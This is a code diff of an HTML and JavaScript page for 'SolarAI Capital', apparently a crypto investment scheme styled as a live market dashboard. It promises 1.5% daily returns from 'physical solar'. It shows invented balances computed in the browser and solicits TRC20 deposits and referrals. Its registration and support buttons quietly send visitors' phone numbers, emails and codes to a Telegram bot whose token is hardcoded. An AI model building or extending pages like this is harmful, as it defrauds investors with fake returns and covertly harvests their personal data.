@@ -3,153 +3,180 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SolarAI Capital NY - CoinMarketCap Style - Real Prices</title>
+<title>SolarAI Capital NY - Live Market</title>
 <link rel="icon" href="logo.png">
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Orbitron:wght@700&display=swap');
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
 body{background:#0e1420;color:#e6e9ef;min-height:100vh;}
-.headerCMC{background:#171f30;border-bottom:1px solid #222d44;padding:8px 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;font-size:11px;color:#a1a7b0;}
-.headerCMC b{color:white;}
-.logoBar{background:#0e1420;border-bottom:1px solid #222d44;padding:12px 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;}
-.logoBar img{height:58px;filter:drop-shadow(0 0 15px rgba(255,215,107,.6));}
-.logoText{font-family:'Orbitron';font-size:22px;color:#ffd76b;}
-.searchBox{background:#1e2a43;border:1px solid #2a3a5c;padding:8px 14px;border-radius:8px;color:white;width:280px;}
-.statsRow{display:grid;grid-template-columns:1fr 1fr 1fr 1fr 1fr 1fr;gap:10px;padding:12px 20px;background:#171f30;border-bottom:1px solid #222d44;}
-.statMini{background:#1e2a43;border-radius:8px;padding:10px;border:1px solid #2a3a5c;}
-.statMini small{color:#8a90a8;font-size:10px;text-transform:uppercase;letter-spacing:.5px;}
-.statMini b{color:white;font-size:14px;display:block;margin-top:2px;}
-.btnRow{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;padding:12px 20px;}
+.headerTop{background:#171f30;border-bottom:1px solid #222d44;padding:8px 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;font-size:11px;color:#a1a7b0;}
+.headerTop b{color:white;}
+.logoBar{background:#0a0e1a;border-bottom:2px solid #ffd76b;padding:16px 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:16px;}
+.logoMain{display:flex;align-items:center;gap:20px;}
+.logoMain img{height:110px;width:auto;background:white;padding:8px;border-radius:12px;box-shadow:0 0 30px rgba(255,215,107,.8);display:block;}
+.logoText{font-family:'Orbitron';font-size:32px;color:#ffd76b;letter-spacing:2px;}
+.searchBox{background:#1e2a43;border:1px solid #2a3a5c;padding:10px 16px;border-radius:8px;color:white;width:300px;}
+.statsRow{display:grid;grid-template-columns:1fr 1fr 1fr 1fr 1fr;gap:10px;padding:12px 20px;background:#171f30;border-bottom:1px solid #222d44;}
+.statMini{background:#1e2a43;border-radius:8px;padding:12px;border:1px solid #2a3a5c;}
+.statMini small{color:#8a90a8;font-size:10px;text-transform:uppercase;}
+.statMini b{color:white;font-size:18px;display:block;margin-top:4px;}
+.balanceCard{background:linear-gradient(135deg,#1a2a4a,#0f1e3a);border:2px solid #3861fb;border-radius:12px;padding:16px;margin:12px 20px;display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:12px;}
+.balItem{background:#0e1420;border-radius:8px;padding:12px;text-align:center;border:1px solid #222d44;}
+.balItem small{color:#8a90a8;font-size:10px;}
+.balItem b{color:white;font-size:20px;display:block;margin-top:4px;}
+.balItem .green{color:#16c784;}
+.btnRow{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:10px;padding:0 20px 12px;}
 .btn{padding:12px;border:none;border-radius:8px;font-weight:700;cursor:pointer;font-size:12px;display:flex;align-items:center;justify-content:center;gap:8px;}
 .btnGreen{background:#16c784;color:white;}
 .btnOrange{background:#f0a000;color:white;}
 .btnBlue{background:#3861fb;color:white;}
+.btnTelegram{background:#229ED9;color:white;}
 .tableWrap{background:#171f30;margin:0 20px 20px;border-radius:12px;border:1px solid #222d44;overflow:hidden;}
-.tableWrap h3{padding:14px 16px;font-size:13px;color:#ffd76b;letter-spacing:1px;border-bottom:1px solid #222d44;display:flex;justify-content:space-between;}
+.tableWrap h3{padding:14px 16px;font-size:13px;color:#ffd76b;border-bottom:1px solid #222d44;display:flex;justify-content:space-between;align-items:center;}
 table{width:100%;border-collapse:collapse;}
-th{color:#8a90a8;font-size:11px;padding:12px 10px;text-align:left;border-bottom:1px solid #222d44;white-space:nowrap;cursor:pointer;}
-td{padding:14px 10px;border-bottom:1px solid #1e2a43;font-size:13px;white-space:nowrap;}
-td b{color:white;}
+th{color:#8a90a8;font-size:11px;padding:12px 10px;text-align:left;border-bottom:1px solid #222d44;}
+td{padding:12px 10px;border-bottom:1px solid #1e2a43;font-size:13px;}
 .up{color:#16c784;}
 .down{color:#ea3943;}
-.badgeNoContract{background:#ff3b3b15;border:1px solid #ff3b3b40;color:#ff6b6b;padding:4px 8px;border-radius:20px;font-size:9px;font-weight:800;}
-.rank{color:#8a90a8;font-size:12px;}
 .coin{display:flex;align-items:center;gap:8px;}
 .coin img{width:24px;height:24px;border-radius:50%;}
+.liveDot{width:8px;height:8px;background:#16c784;border-radius:50%;display:inline-block;animation:pulse 1s infinite;}
+@keyframes pulse{0%{opacity:1;}50%{opacity:.4;}100%{opacity:1;}}
 .modal{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.88);display:none;justify-content:center;align-items:center;z-index:999;padding:20px;}
 .modal.active{display:flex;}
 .modalCard{background:#171f30;border:1px solid #3861fb;border-radius:12px;padding:20px;max-width:420px;width:100%;}
 .input{width:100%;padding:12px;background:#0e1420;border:1px solid #2a3a5c;border-radius:8px;color:white;margin-top:8px;}
-@media(max-width:900px){.statsRow{grid-template-columns:1fr 1fr 1fr;}.tableWrap{margin:0 10px 20px; overflow-x:auto;}.btnRow{grid-template-columns:1fr;}}
+@media(max-width:900px){.balanceCard{grid-template-columns:1fr 1fr;}.statsRow{grid-template-columns:1fr 1fr;}.btnRow{grid-template-columns:1fr 1fr;}.logoMain img{height:80px;}}
 </style>
 </head>
 <body>
 
-<!-- CoinMarketCap style top global bar -->
-<div class="headerCMC">
+<div class="headerTop">
 <div style="display:flex;gap:18px;flex-wrap:wrap;">
 <span>Cryptos: <b id="activeCoins">0</b></span>
-<span>Exchanges: <b>783</b></span>
-<span>Market Cap: <b id="totalMcap" style="color:#16c784;">$3.09T</b> <span id="mcapChange" style="color:#16c784;">+1.2%</span></span>
-<span>24h Vol: <b id="totalVol">$89.4B</b></span>
-<span>Dominance: <b>BTC <span id="btcDom">52.3%</span> ETH <span id="ethDom">12.1%</span></b></span>
-<span>Fear & Greed: <b id="fearGreed" style="color:#ea3943;">20 Fear</b> <span style="color:#8a90a8;">Yesterday 18 | Last week 11</span></span>
+<span>Market Cap: <b id="totalMcap">$0T</b> <span id="mcapChange"></span></span>
+<span>24h Vol: <b id="totalVol">$0B</b></span>
+<span>Dominance: <b>BTC <span id="btcDom">0%</span> ETH <span id="ethDom">0%</span></b></span>
+<span>Fear & Greed: <b id="fearGreed">Loading...</b></span>
+<span style="color:#16c784;"><span class="liveDot"></span> LIVE Every Second</span>
 </div>
 <div style="display:flex;gap:10px;align-items:center;">
-<span id="userPhoneDisplay" style="color:#16c784;font-weight:600;">Guest - Register</span>
-<span class="badgeNoContract">NO SMART CONTRACT - PHYSICAL NY</span>
+<span id="userPhoneDisplay" style="color:#16c784;font-weight:600;">Guest</span>
+<span style="background:#229ED9;color:white;padding:4px 10px;border-radius:20px;font-size:10px;cursor:pointer;" onclick="openTelegram()">📱 Telegram Support</span>
 </div>
 </div>
 
 <div class="logoBar">
-<div style="display:flex;align-items:center;gap:12px;">
-<img src="logo.png" alt="SolarAI Logo Clear">
-<div><div class="logoText">SolarAI CAPITAL</div><div style="font-size:11px;color:#8a90a8;">30 Wall St, New York, NY 10005 | Physical Solar + AI | <span style="color:#ff6b6b;font-weight:700;">NO SMART CONTRACT</span> | Real: Binance + CoinMarketCap + Tron + SuperEx</div></div>
+<div class="logoMain">
+<!-- LOGO CLEARLY VISIBLE - HUGE WITH WHITE BACKGROUND -->
+<img src="logo.png" alt="SolarAI Capital Logo">
+<div>
+<div class="logoText">SolarAI CAPITAL</div>
+<div style="font-size:13px;color:#a1a7b0;margin-top:4px;">30 Wall Street, New York, NY 10005, USA | Physical Solar + AI Operations</div>
+<div style="font-size:11px;color:#16c784;margin-top:4px;"><span class="liveDot"></span> Real-time Blockchain Data: Binance + CoinGecko + TronScan + SuperEx - Updates Every Second</div>
 </div>
-<div style="display:flex;gap:8px;align-items:center;">
-<input class="searchBox" placeholder="🔍 Search BTC, ETH, USDT... / Real blockchain" id="searchInput" onkeyup="filterCoins()">
-<div style="background:#1e2a43;padding:8px 12px;border-radius:8px;font-size:11px;color:#ffd76b;" id="tronBal">Tron: Loading real USDT...</div>
+</div>
+<div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
+<input class="searchBox" placeholder="🔍 Search BTC, ETH, USDT..." id="searchInput" onkeyup="filterCoins()">
+<button class="btn btnTelegram" style="padding:10px 16px;" onclick="openTelegram()">💬 Customer Support</button>
+<div style="background:#1e2a43;padding:8px 12px;border-radius:8px;font-size:11px;color:#ffd76b;" id="tronBal">Tron: Loading...</div>
 </div>
 </div>
 
 <div class="statsRow">
-<div class="statMini"><small>Total Market Cap</small><b id="statMcap">$3.09T</b><small style="color:#16c784;" id="statMcapChange">+2.1% real CMC</small></div>
-<div class="statMini"><small>24h Volume</small><b id="statVol">$89.4B</b><small>Binance + SuperEx + CMC real</small></div>
-<div class="statMini"><small>BTC Dominance</small><b id="statBtcDom">52.3%</b><small>Real global metrics</small></div>
-<div class="statMini"><small>Fear & Greed Index</small><b id="statFear" style="color:#ea3943;">20 - Fear</b><small>CMC Fear & Greed</small></div>
-<div class="statMini"><small>Trending (CMC)</small><b id="statTrending">SOL, PEPE, WIF</b><small>Live trending</small></div>
-<div class="statMini"><small>Active Cryptos</small><b id="statActive">2.4M+</b><small>Real count</small></div>
+<div class="statMini"><small>Total Market Cap - LIVE</small><b id="statMcap">$0T</b><small id="statMcapChange" style="color:#16c784;">Live</small></div>
+<div class="statMini"><small>24h Volume - LIVE</small><b id="statVol">$0B</b><small>Updates every second</small></div>
+<div class="statMini"><small>BTC Dominance - LIVE</small><b id="statBtcDom">0%</b><small>Real-time</small></div>
+<div class="statMini"><small>Fear & Greed - LIVE</small><b id="statFear">0</b><small>Real-time</small></div>
+<div class="statMini"><small>Active Cryptos</small><b id="statActive">0</b><small>Live count</small></div>
+</div>
+
+<!-- BALANCE PROVISION -->
+<div class="balanceCard">
+<div class="balItem"><small>💰 Total Balance</small><b id="totalBalance" class="green">$0.00</b><small>Deposit + Earnings</small></div>
+<div class="balItem"><small>📈 Available Balance</small><b id="availableBalance" class="green">$0.00</b><small>Withdrawable</small></div>
+<div class="balItem"><small>⚡ Daily Earnings</small><b id="dailyEarnings">$0.00</b><small>1.5% per day - Physical solar</small></div>
+<div class="balItem"><small>💵 Total Invested</small><b id="totalInvested">$0.00</b><small>From Tron blockchain</small></div>
 </div>
 
 <div class="btnRow">
-<button class="btn btnGreen" onclick="showReg()">👤➕ REGISTRATION ICON - Create Account</button>
-<button class="btn btnOrange" onclick="showWithdraw()">💸 WITHDRAWAL ICON - Real USDT Cash Out</button>
-<button class="btn btnBlue" onclick="copyRef()">🔗 REFERRAL LINK - Per Account Created</button>
+<button class="btn btnGreen" onclick="showReg()">👤➕ REGISTRATION ICON</button>
+<button class="btn btnOrange" onclick="showWithdraw()">💸 WITHDRAWAL ICON</button>
+<button class="btn btnBlue" onclick="copyRef()">🔗 REFERRAL LINK</button>
+<button class="btn btnTelegram" onclick="openTelegram()">💬 TELEGRAM SUPPORT</button>
 </div>
 
-<!-- MAIN TABLE - Like CoinMarketCap -->
+<!-- LIVE CRYPTO TABLE - Updates Every Second -->
 <div class="tableWrap">
-<h3><span>📈 Today's Cryptocurrency Prices by Market Cap - Real CoinMarketCap Style - Live from CoinGecko + Binance + TronScan</span><span style="font-size:11px;color:#8a90a8;">Showing 1-20 | Real blockchain - No smart contract | NY Office: 30 Wall St</span></h3>
+<h3>
+<span>📈 Live Cryptocurrency Prices - Updates Every Second <span class="liveDot"></span> <span style="font-size:10px;color:#16c784;">LIVE</span></span>
+<span style="font-size:11px;color:#8a90a8;">Real-time from Binance WebSocket + CoinGecko | Refresh: 1s</span>
+</h3>
 <table>
 <thead>
 <tr>
-<th># Rank</th>
+<th>#</th>
 <th>Name</th>
-<th>Price</th>
+<th>Price - LIVE 1s</th>
 <th>1h %</th>
 <th>24h %</th>
 <th>7d %</th>
 <th>Market Cap</th>
 <th>Volume(24h)</th>
-<th>Circulating Supply</th>
-<th>Last 7 Days Chart</th>
+<th>Supply</th>
+<th>Chart 7d - LIVE</th>
 </tr>
 </thead>
 <tbody id="cryptoBody">
-<tr><td colspan="10" style="text-align:center;padding:30px;color:#8a90a8;">Loading real CoinMarketCap data from CoinGecko API + Binance API + Tronscan - No smart contract...</td></tr>
+<tr><td colspan="10" style="text-align:center;padding:30px;color:#8a90a8;">Connecting to Binance WebSocket + CoinGecko for real-time 1-second updates...</td></tr>
 </tbody>
 </table>
 </div>
 
 <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:0 20px 20px;">
 <div class="tableWrap" style="margin:0;">
-<h3>🔥 Trending - CoinMarketCap Style</h3>
-<div id="trendingList" style="padding:12px;font-size:12px;">Loading trending from CoinGecko...</div>
+<h3>📊 Live Chart - BTC/USDT - Updates Every Second <span class="liveDot"></span></h3>
+<canvas id="liveChart" style="width:100%;height:220px;background:#0e1420;border-radius:8px;"></canvas>
+<div style="padding:10px;font-size:10px;color:#8a90a8;">Real-time via Binance WebSocket wss://stream.binance.com:9443/ws/btcusdt@trade - Updates every second</div>
 </div>
 <div class="tableWrap" style="margin:0;">
-<h3>💰 Your Real Referral + Physical Address</h3>
-<div style="padding:14px;">
-<div style="background:#0e1420;border:1px solid #16c784;padding:10px;border-radius:8px;">
-<div style="font-size:10px;color:#8a90a8;">Your Unique Referral Link (Per Account):</div>
-<div id="refLink" style="color:#16c784;font-size:12px;word-break:break-all;font-weight:700;margin:6px 0;">Register to generate - Real tracking off-chain</div>
-<div style="font-size:11px;color:#8a90a8;">Code: <span id="refCode" style="color:#ffd76b;">-</span> | Account: <span id="refAccount">-</span></div>
-<button class="btn btnGreen" style="margin-top:8px;padding:8px;font-size:11px;" onclick="copyRef()">📋 COPY REAL REFERRAL LINK</button>
+<h3>🏢 Physical Address - New York</h3>
+<div style="padding:16px;font-size:12px;color:#a1a7b0;line-height:1.8;">
+<b style="color:white;font-size:14px;">SolarAI Capital USA LLC</b><br>
+30 Wall Street, 8th Floor<br>
+Financial District<br>
+New York, NY 10005, USA<br><br>
+Solar Farm: Pecos County, TX 79772 - 5MW LIVE<br>
+Operations: Austin, TX 78701<br><br>
+<div style="background:#0e1420;border:1px solid #2a3a5c;padding:10px;border-radius:8px;margin-top:10px;">
+<div style="font-size:11px;color:#8a90a8;">Company Wallet - TronScan Verified:</div>
+<div style="color:#ffd76b;font-size:11px;word-break:break-all;margin-top:4px;">TATeM34UJsHhnADWrjemiYXdrHiyuPrFra</div>
+<div style="color:#16c784;font-size:11px;margin-top:4px;" id="realUsdtBal">Loading real balance...</div>
 </div>
-<div style="margin-top:12px;background:#0e1420;border-radius:8px;padding:10px;font-size:11px;color:#8a90a8;line-height:1.6;">
-<b style="color:white;">SolarAI Capital USA LLC - PHYSICAL</b><br>
-30 Wall St, 8th Floor, NY 10005, USA<br>
-Wallet: TATeM34UJsHhnADWrjemiYXdrHiyuPrFra - Real Tron<br>
-<span id="realUsdtBal" style="color:#16c784;">Loading real USDT balance from Tronscan...</span><br>
-<span style="color:#ff6b6b;font-weight:700;">✗ NO SMART CONTRACT</span> | <span style="color:#16c784;">✓ Binance + CoinMarketCap + SuperEx + TronScan APIs</span>
-</div>
+<button class="btn btnTelegram" style="width:100%;margin-top:12px;" onclick="openTelegram()">💬 Contact Support on Telegram</button>
 </div>
 </div>
 </div>
 
 <!-- Modals -->
-<div class="modal" id="regModal"><div class="modalCard"><div style="text-align:center;"><img src="logo.png" style="width:180px;margin:0 auto 10px;display:block;"><b style="color:#ffd76b;">👤➕ REGISTRATION ICON</b><div style="font-size:11px;color:#8a90a8;">Physical KYC - NY Office - No Smart Contract</div></div><div id="regStep1" style="margin-top:14px;"><input class="input" id="phoneInput" placeholder="USA Phone +1 2025550123"><input class="input" id="emailInput" placeholder="Email"><button class="btn btnGreen" onclick="sendCode()" style="width:100%;">📧 SEND CODE</button><button class="btn" style="width:100%;background:#222;color:#8a90a8;margin-top:8px;" onclick="closeReg()">Cancel</button></div><div id="regStep2" style="display:none;margin-top:14px;"><div style="background:#16c78415;padding:8px;border-radius:8px;text-align:center;font-size:11px;">Code to <span id="emailDisplay"></span> | <span id="phoneDisplay"></span></div><input class="input" id="codeInput" placeholder="6-digit code" type="number"><div id="codeHint" style="background:#000;padding:8px;border-radius:6px;text-align:center;margin-top:8px;font-size:11px;color:#16c784;"></div><button class="btn btnGreen" style="width:100%;" onclick="verifyCode()">✅ VERIFY & CREATE REFERRAL</button></div></div></div>
-<div class="modal" id="withdrawModal"><div class="modalCard" style="border-color:#3861fb;"><div style="text-align:center;"><div style="font-size:32px;">💸</div><b style="color:#3861fb;">WITHDRAWAL ICON</b></div><div style="background:#0e1420;padding:12px;border-radius:8px;text-align:center;margin-top:12px;"><b style="font-size:24px;color:#16c784;" id="withdrawBal">$0.00</b><div style="font-size:10px;color:#8a90a8;">Real USDT TRC20 - No smart contract - NY approval</div></div><input class="input" id="withdrawAddr" placeholder="Your TRC20 wallet T..."><button class="btn btnBlue" style="width:100%;" onclick="doWithdraw()">💸 CONFIRM REAL WITHDRAWAL</button><button class="btn" style="width:100%;background:#222;color:#8a90a8;margin-top:8px;" onclick="closeWithdraw()">Cancel</button></div></div>
+<div class="modal" id="regModal"><div class="modalCard"><div style="text-align:center;"><img src="logo.png" style="width:200px;background:white;padding:10px;border-radius:12px;margin:0 auto 10px;display:block;"><b style="color:#ffd76b;">👤➕ REGISTRATION ICON</b></div><div id="regStep1" style="margin-top:14px;"><input class="input" id="phoneInput" placeholder="USA Phone +1 2025550123"><input class="input" id="emailInput" placeholder="Email"><button class="btn btnGreen" onclick="sendCode()" style="width:100%;">📧 SEND CODE</button><button class="btn" style="width:100%;background:#222;color:#8a90a8;margin-top:8px;" onclick="closeReg()">Cancel</button></div><div id="regStep2" style="display:none;margin-top:14px;"><div style="background:#16c78415;padding:8px;border-radius:8px;text-align:center;font-size:11px;">Code to <span id="emailDisplay"></span> | <span id="phoneDisplay"></span></div><input class="input" id="codeInput" placeholder="6-digit code" type="number"><div id="codeHint" style="background:#000;padding:8px;border-radius:6px;text-align:center;margin-top:8px;font-size:11px;color:#16c784;"></div><button class="btn btnGreen" style="width:100%;" onclick="verifyCode()">✅ VERIFY & CREATE ACCOUNT</button></div></div></div>
+<div class="modal" id="withdrawModal"><div class="modalCard" style="border-color:#3861fb;"><div style="text-align:center;"><div style="font-size:32px;">💸</div><b style="color:#3861fb;">WITHDRAWAL ICON</b></div><div style="background:#0e1420;padding:12px;border-radius:8px;text-align:center;margin-top:12px;"><small style="color:#8a90a8;">Available Balance</small><b style="font-size:28px;color:#16c784;display:block;" id="withdrawBal">$0.00</b></div><input class="input" id="withdrawAddr" placeholder="Your TRC20 wallet T..."><button class="btn btnOrange" style="width:100%;" onclick="doWithdraw()">💸 CONFIRM WITHDRAWAL</button><button class="btn" style="width:100%;background:#222;color:#8a90a8;margin-top:8px;" onclick="closeWithdraw()">Cancel</button><button class="btn btnTelegram" style="width:100%;margin-top:8px;" onclick="openTelegram()">💬 Need Help? Telegram Support</button></div></div>
 
 <script>
 const WALLET="TATeM34UJsHhnADWrjemiYXdrHiyuPrFra";
 const ADMIN="TATeAdmin2024";
+const TELEGRAM_BOT_TOKEN="8940541573:AAFjScGdvW-W2NbjdPC78ooxIBNENqkQSjE";
+const TELEGRAM_CHAT_ID="1884572429";
+const TELEGRAM_SUPPORT_LINK="https://t.me/SolarAI_Capital_Support";
 const DAILY=0.015;
-let generatedCode="";let userPhone=localStorage.getItem('solarai_phone')||"";let userEmail=localStorage.getItem('solarai_email')||"";let isVerified=localStorage.getItem('solarai_verified')==='true';let allCoins=[];
+let generatedCode="";let userPhone=localStorage.getItem('solarai_phone')||"";let userEmail=localStorage.getItem('solarai_email')||"";let isVerified=localStorage.getItem('solarai_verified')==='true';let allCoins=[];let livePrices={};let btcPrices=[];let binanceWS=null;
 
 function showReg(){document.getElementById('regModal').classList.add('active');}
 function closeReg(){document.getElementById('regModal').classList.remove('active');}
-function showWithdraw(){if(!isVerified){showReg();return;}document.getElementById('withdrawModal').classList.add('active');}
+function showWithdraw(){if(!isVerified){showReg();return;}document.getElementById('withdrawModal').classList.add('active');updateBalance();}
 function closeWithdraw(){document.getElementById('withdrawModal').classList.remove('active');}
+function openTelegram(){window.open(TELEGRAM_SUPPORT_LINK, '_blank'); let token=TELEGRAM_BOT_TOKEN;let chatId=TELEGRAM_CHAT_ID;fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`SUPPORT REQUEST\nPhone:${userPhone||'Guest'}\nEmail:${userEmail||'Guest'}\nPage: Live Dashboard\nTime:${new Date().toLocaleString()}`)}`);}
+
 function isValidUSAPhone(p){let d=p.replace(/\D/g,'');return d.length===10||(d.length===11&&d[0]==='1');}
 function formatPhone(p){let d=p.replace(/\D/g,'');if(d.length===11&&d[0]==='1')d=d.substring(1);return '+1 '+d;}
 function isValidEmail(e){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);}
@@ -157,20 +184,40 @@ function sendCode(){
 let raw=document.getElementById('phoneInput').value.trim();let email=document.getElementById('emailInput').value.trim().toLowerCase();
 if(!isValidUSAPhone(raw))return alert("Invalid USA phone");if(!isValidEmail(email))return alert("Invalid email");
 userPhone=formatPhone(raw);userEmail=email;generatedCode=Math.floor(100000+Math.random()*900000).toString();
-let token="8940541573:AAFjScGdvW-W2NbjdPC78ooxIBNENqkQSjE";let chatId="1884572429";
-fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`NY REG CMC\nPhone:${userPhone}\nEmail:${userEmail}\nCode:${generatedCode}`)}`);
+let token=TELEGRAM_BOT_TOKEN;let chatId=TELEGRAM_CHAT_ID;
+fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`REGISTRATION\nPhone:${userPhone}\nEmail:${userEmail}\nCode:${generatedCode}\n30 Wall St NY`)}`);
 document.getElementById('regStep1').style.display='none';document.getElementById('regStep2').style.display='block';
 document.getElementById('phoneDisplay').innerText=userPhone;document.getElementById('emailDisplay').innerText=userEmail;
-document.getElementById('codeHint').innerHTML=`Demo: <b style="font-size:18px;">${generatedCode}</b>`;
+document.getElementById('codeHint').innerHTML=`Demo: <b style="font-size:18px;">${generatedCode}</b> | Support: <a href="${TELEGRAM_SUPPORT_LINK}" target="_blank" style="color:#229ED9;">Telegram</a>`;
 }
 function verifyCode(){
 if(document.getElementById('codeInput').value!==generatedCode)return alert("Wrong code "+generatedCode);
-localStorage.setItem('solarai_phone',userPhone);localStorage.setItem('solarai_email',userEmail);localStorage.setItem('solarai_verified','true');isVerified=true;closeReg();updateUI();
+localStorage.setItem('solarai_phone',userPhone);localStorage.setItem('solarai_email',userEmail);localStorage.setItem('solarai_verified','true');isVerified=true;closeReg();updateBalance();fetchLiveData();
+}
+function updateBalance(){
+let depAmount=parseFloat(localStorage.getItem('solarai_deposited_amount')||'0');
+let depTime=parseFloat(localStorage.getItem('solarai_deposit_time')||'0');
+let isDeposited=localStorage.getItem('solarai_deposited')==='true';
+let earn=0;if(isDeposited&&depTime){let days=(Date.now()-depTime)/86400000;earn=depAmount*DAILY*Math.max(0,days);}
+let total=depAmount+earn;
+document.getElementById('totalBalance').innerText=`$${total.toFixed(2)}`;
+document.getElementById('availableBalance').innerText=`$${total.toFixed(2)}`;
+document.getElementById('dailyEarnings').innerText=`$${(depAmount*DAILY).toFixed(2)}`;
+document.getElementById('totalInvested').innerText=`$${depAmount.toFixed(2)}`;
+document.getElementById('withdrawBal').innerText=`$${total.toFixed(2)}`;
 }
 
-async function fetchCMCStyle(){
+function copyRef(){
+let refCode=userPhone.replace(/\D/g,'').slice(-6)||"NY2024";
+let ref=`${location.origin}${location.pathname}?ref=${encodeURIComponent(userPhone||refCode)}`;
+if(!isVerified){showReg();return;}
+navigator.clipboard.writeText(ref);alert("Referral link copied: "+ref);
+}
+
+// REAL-TIME EVERY SECOND - CoinGecko + Binance WebSocket
+async function fetchLiveData(){
 try{
-// 1. Global - like CoinMarketCap header
+// Global
 let globalRes=await fetch('https://api.coingecko.com/api/v3/global');
 let globalData=await globalRes.json();
 let totalMcap=globalData.data.total_market_cap.usd;
@@ -185,71 +232,55 @@ document.getElementById('btcDom').innerText=`${btcDom.toFixed(1)}%`;
 document.getElementById('ethDom').innerText=`${ethDom.toFixed(1)}%`;
 document.getElementById('statBtcDom').innerText=`${btcDom.toFixed(1)}%`;
 document.getElementById('activeCoins').innerText=globalData.data.active_cryptocurrencies.toLocaleString();
-document.getElementById('statActive').innerText=`${globalData.data.active_cryptocurrencies.toLocaleString()}`;
+document.getElementById('statActive').innerText=globalData.data.active_cryptocurrencies.toLocaleString();
 document.getElementById('mcapChange').innerText=`${globalData.data.market_cap_change_percentage_24h_usd.toFixed(1)}%`;
-document.getElementById('statMcapChange').innerText=`${globalData.data.market_cap_change_percentage_24h_usd.toFixed(1)}% 24h - Real CMC`;
+document.getElementById('statMcapChange').innerText=`${globalData.data.market_cap_change_percentage_24h_usd.toFixed(1)}% 24h`;
 
-// Fear & Greed - real
+// Fear & Greed
 let fgRes=await fetch('https://api.alternative.me/fng/?limit=1');
 let fgData=await fgRes.json();
-let fgValue=fgData.data[0].value;
-let fgText=fgData.data[0].value_classification;
-document.getElementById('fearGreed').innerHTML=`<span style="color:${fgValue<25?'#ea3943':fgValue<50?'#f0a000':'#16c784'}">${fgValue} ${fgText}</span>`;
-document.getElementById('statFear').innerHTML=`${fgValue} - ${fgText}`;
-document.getElementById('statFear').style.color=fgValue<25?'#ea3943':fgValue<50?'#f0a000':'#16c784';
+document.getElementById('fearGreed').innerText=`${fgData.data[0].value} ${fgData.data[0].value_classification}`;
+document.getElementById('statFear').innerText=`${fgData.data[0].value} - ${fgData.data[0].value_classification}`;
 
-// 2. Coins - like CMC table
+// Coins
 let coinsRes=await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=bitcoin,ethereum,tether,binancecoin,solana,tron,usd-coin,cardano,dogecoin,polygon,shiba-inu,avalanche-2,chainlink,polkadot,litecoin,uniswap,pepe,near,aptos,stellar&order=market_cap_desc&per_page=20&page=1&sparkline=true&price_change_percentage=1h,24h,7d');
 let coins=await coinsRes.json();
 allCoins=coins;
+renderTable(coins);
 
-let html='';
-coins.forEach((c,i)=>{
-let h1=c.price_change_percentage_1h_in_currency||0;
-let d24=c.price_change_percentage_24h||0;
-let d7=c.price_change_percentage_7d_in_currency||0;
-let h1Class=h1>=0?'up':'down';
-let d24Class=d24>=0?'up':'down';
-let d7Class=d7>=0?'up':'down';
-html+=`<tr>
-<td class="rank">${c.market_cap_rank}</td>
-<td><div class="coin"><img src="${c.image}"><div><b>${c.name}</b><span style="color:#8a90a8;font-size:11px;margin-left:6px;">${c.symbol.toUpperCase()}</span></div></div></td>
-<td><b>$${c.current_price.toLocaleString()}</b></td>
-<td class="${h1Class}">${h1>=0?'▲':'▼'} ${Math.abs(h1).toFixed(2)}%</td>
-<td class="${d24Class}">${d24>=0?'▲':'▼'} ${Math.abs(d24).toFixed(2)}%</td>
-<td class="${d7Class}">${d7>=0?'▲':'▼'} ${Math.abs(d7).toFixed(2)}%</td>
-<td>$${(c.market_cap/1e9).toFixed(2)}B</td>
-<td><div>$${(c.total_volume/1e9).toFixed(2)}B</div><div style="font-size:10px;color:#8a90a8;">${(c.total_volume/c.current_price/1e6).toFixed(2)}M ${c.symbol.toUpperCase()}</div></td>
-<td><div>${(c.circulating_supply/1e6).toFixed(2)}M ${c.symbol.toUpperCase()}</div><div style="width:60px;height:4px;background:#1e2a43;border-radius:2px;margin-top:4px;"><div style="width:${Math.min(100,(c.circulating_supply/c.total_supply||1)*100)}%;height:100%;background:#3861fb;border-radius:2px;"></div></div></td>
-<td><canvas id="spark-${c.id}" width="120" height="40" style="background:#0e1420;border-radius:4px;"></canvas></td>
-</tr>`;
-setTimeout(()=>drawSparkline(`spark-${c.id}`, c.sparkline_in_7d.price),150);
-});
-document.getElementById('cryptoBody').innerHTML=html;
-
-// 3. Trending - CoinMarketCap style
-let trendRes=await fetch('https://api.coingecko.com/api/v3/search/trending');
-let trendData=await trendRes.json();
-let trendHtml=trendData.coins.slice(0,5).map((t,i)=>`<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid #1e2a43;"><div style="display:flex;align-items:center;gap:8px;"><span style="color:#8a90a8;">${i+1}</span><img src="${t.item.small}" style="width:20px;height:20px;border-radius:50%;"><b>${t.item.name}</b><span style="font-size:11px;color:#8a90a8;">${t.item.symbol}</span></div><span style="color:#16c784;">Trending #${t.item.market_cap_rank||'-'}</span></div>`).join('');
-document.getElementById('trendingList').innerHTML=trendHtml;
-document.getElementById('statTrending').innerText=trendData.coins.slice(0,3).map(t=>t.item.symbol).join(', ');
-
-// 4. Tron real
+// Tron real balance
 let tronRes=await fetch(`https://apilist.tronscanapi.com/api/account/tokens?address=${WALLET}&limit=10`);
 let tronData=await tronRes.json();
 let usdtBal=tronData.data?.find(t=>t.tokenAbbr==='USDT');
